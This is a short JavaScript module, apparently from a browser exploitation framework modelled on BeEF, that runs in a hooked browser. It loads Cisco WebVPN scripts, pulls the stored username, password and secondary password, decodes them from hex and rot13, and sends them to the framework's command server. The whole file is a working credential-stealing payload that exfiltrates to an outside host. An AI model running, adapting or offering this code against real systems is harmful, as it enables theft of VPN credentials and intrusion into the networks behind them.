//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - http://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
  var s = document.createElement("script");
  s.src = "/+CSCOE+/common.js"
  document.body.appendChild(s);
  s = document.createElement("script");
  s.src = "/+CSCOE+/appstart.js";
  document.body.appendChild(s);

  if (typeof getcredentials === "function") {
    setTimeout(function () {
      let creds = getcredentials();
      var result = [];
      result.push({
        "username": rot13(hex_2_ascii(creds.split('/')[0].split('=')[1])),
        "password": rot13(hex_2_ascii(creds.split('/')[1].split('=')[1])),
        "secondary_password": rot13(hex_2_ascii(creds.split('/')[5].split('=')[1]))
      });
      server.net.send("<%= @command_url %>", <%= @command_id %>, "result=" + JSON.stringify(result));
    }, 3000);
  } else {
    server.net.send("<%= @command_url %>", <%= @command_id %>, "failed, most likely due to no auth");
  }
});
